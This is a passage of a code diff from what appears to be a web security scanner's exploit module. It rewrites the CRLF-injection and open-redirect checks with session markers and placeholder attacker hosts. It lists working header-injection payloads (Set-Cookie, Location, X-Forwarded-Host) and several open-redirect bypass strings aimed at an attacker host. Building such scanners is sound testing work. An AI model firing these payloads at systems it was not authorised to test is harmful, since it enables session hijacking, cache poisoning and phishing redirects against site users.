+            hdrs_l = {k.lower(): v for k, v in r.response_headers.items()}
+            # Cookie injection
+            sc = hdrs_l.get("set-cookie", "")
+            if _sess_marker in sc:
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = f"Injected Set-Cookie (marker: {_sess_marker})"
+                r.false_positive_risk = "very_low"
+                return
+            # Injected custom header
+            xi = hdrs_l.get("x-injected", "")
+            if _sess_marker in xi:
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = "Injected X-Injected header appears in response"
+                r.false_positive_risk = "very_low"
+                return
+            # Location redirect — our injected payload contains /crlf_<marker>
+            # so any Location header carrying the marker is the smoking gun.
+            loc = hdrs_l.get("location", "")
+            if _sess_marker in loc or f"/crlf_{_sess_marker}" in loc:
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = f"Location header injected: {loc[:80]}"
+                r.false_positive_risk = "very_low"
+                return
+            # Cache-key poisoning probe (X-Forwarded-Host reflection)
+            xfh = hdrs_l.get("x-forwarded-host", "")
+            if _sess_marker in xfh:
                 r.success = True
                 r.confidence = 0.9
-                r.evidence = "Injected header appears in response"
+                r.evidence = "X-Forwarded-Host reflected downstream"
                 r.false_positive_risk = "low"
+                return
+            # Heuristic: response body reflects raw CRLF payload string
+            if _sess_marker in r.response_body:
+                r.confidence = 0.4
+                r.evidence = "Marker reflected in body (not header) — filter"
+                r.false_positive_risk = "medium"
 
         crlf_payloads = [
-            ("Cookie injection", "%0d%0aSet-Cookie:%20session=hijacked"),
-            ("Location redirect", "%0d%0aLocation:%20https://evil.com"),
-            ("Cache poisoning", "%0d%0aX-Forwarded-Host:%20evil.com"),
+            ("Cookie injection",
+             f"%0d%0aSet-Cookie:%20crlf_probe={_sess_marker}"),
+            ("Custom header (X-Injected)",
+             f"%0d%0aX-Injected:%20{_sess_marker}"),
+            ("Location redirect (attacker host)",
+             f"%0d%0aLocation:%20http://[ATTACKER_HOST]/crlf_{_sess_marker}"),
+            ("Cache poisoning (X-Forwarded-Host)",
+             f"%0d%0aX-Forwarded-Host:%20{_sess_marker}.[ATTACKER_HOST]"),
         ]
         steps = []
         for name, payload in crlf_payloads:
@@ -3963,40 +4301,79 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                 "title": f"CRLF: {name}",
                 "request": _get_param(payload),
                 "validate": _crlf_check,
-                "note": f"Injecting via {name}",
+                "note": f"Injecting via {name} (marker: {_sess_marker})",
                 "warning": name,
             })
 
     elif etype == "open_redirect":
-        def _redir_check(r: ExploitResult):
-            loc = r.response_headers.get("Location", "")
-            if "evil.com" in loc or r.status_code in (301, 302, 303, 307, 308):
-                r.success = True
-                r.confidence = 0.85
-                r.evidence = f"Redirect to: {loc[:100]}"
-                r.false_positive_risk = "low"
-            elif r.status_code == 200:
-                r.evidence = "No redirect — server may handle internally"
+        # Open-redirect test: redirect to an attacker-controlled host so a
+        # follow-through can be caught in the callback log on /b. The
+        # validator flags any Location header whose host matches the
+        # attacker host *or* isn't the target's host.
+        _target_host = (base_url.split("//", 1)[1].split("/", 1)[0]
+                        if "//" in base_url else "")
 
-        _host = base_url.split("//")[1].split("/")[0] if "//" in base_url else "target.com"
+        def _redir_check(r: ExploitResult):
+            loc = r.response_headers.get("Location", "") or \
+                  r.response_headers.get("location", "")
+            if not loc and r.status_code in (301, 302, 303, 307, 308):
+                r.evidence = f"Redirect {r.status_code} without Location?"
+                r.confidence = 0.2
+                return
+            if not loc:
+                if r.status_code == 200:
+                    r.evidence = "No redirect — server may handle internally"
+                return
+            loc_low = loc.lower()
+            # Parse redirect target host
+            try:
+                redir_host = urlparse(loc).netloc.lower()
+            except Exception:
+                redir_host = ""
+            # The /r suffix is unique to our crafted payload — a Location
+            # ending with /r is a strong redirect-bypass signal.
+            if loc_low.endswith("/r") or loc_low.rstrip("/").endswith("/r"):
+                # still also require it to be off-site — fall through to the
+                # off-site host check below rather than returning early
+                pass
+            # Attacker host will have been substituted at request time, so
+            # the redirect target should match it if the bypass succeeded.
+            if redir_host and _target_host and \
+               redir_host != _target_host.lower() and \
+               not redir_host.endswith("." + _target_host.lower()):
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = (f"Redirect to off-site host: {redir_host} "
+                              f"(target={_target_host})")
+                r.false_positive_risk = "low"
+                return
+            r.evidence = f"Redirect to same-origin: {loc[:100]}"
+            r.confidence = 0.2
+
         redirect_payloads = [
-            ("Direct URL", "https://evil.com"),
-            ("Protocol-relative", "//evil.com"),
-            ("@ bypass", f"https://{_host}@evil.com"),
-            ("URL-encoded", "%68%74%74%70%73%3a%2f%2fevil.com"),
+            ("Direct URL", "[ATTACKER]/r"),
+            ("Protocol-relative", "//[ATTACKER_HOST]/r"),
+            ("@ bypass",
+             f"https://{_target_host}@[ATTACKER_HOST]/r"
+             if _target_host else "https://[ATTACKER_HOST]/r"),
+            ("Backslash bypass", "/\\[ATTACKER_HOST]/r"),
+            ("URL-encoded scheme",
+             "%68%74%74%70%3a%2f%2f[ATTACKER_HOST]/r"),
+            ("Double slash", "///[ATTACKER_HOST]/r"),
+            ("Whitespace prefix", "%09//[ATTACKER_HOST]/r"),
         ]
         steps = [
             {"title": "Confirm original redirect",
              "request": _get(target),
              "validate": _redir_check,
-             "note": "Check Location header"},
+             "note": "Check Location header baseline"},
         ]
         for name, payload in redirect_payloads:
             steps.append({
                 "title": f"Redirect bypass: {name}",
                 "request": _get_param(payload),
                 "validate": _redir_check,
-                "note": f"Testing {name} bypass",
+                "note": f"Testing {name} bypass → attacker host",
             })
 
     else:
